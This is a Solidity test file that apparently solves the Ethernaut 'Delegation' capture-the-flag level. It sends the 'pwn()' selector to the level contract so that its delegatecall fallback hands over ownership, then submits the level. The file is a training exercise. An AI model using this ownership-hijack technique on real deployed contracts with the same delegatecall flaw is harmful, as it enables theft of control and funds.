// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Delegation/Delegation.sol";
import "../Delegation/DelegationFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract DelegationTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
    }

    function testDelegationAttack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        DelegationFactory delegationFactory = new DelegationFactory();
        ethernaut.registerLevel(delegationFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(delegationFactory);
        Delegation delegation = Delegation(levelAddress);

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        bytes4 signature = bytes4(keccak256("pwn()"));
        (bool result,) = address(delegation).call(abi.encode(signature));
        require(result);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}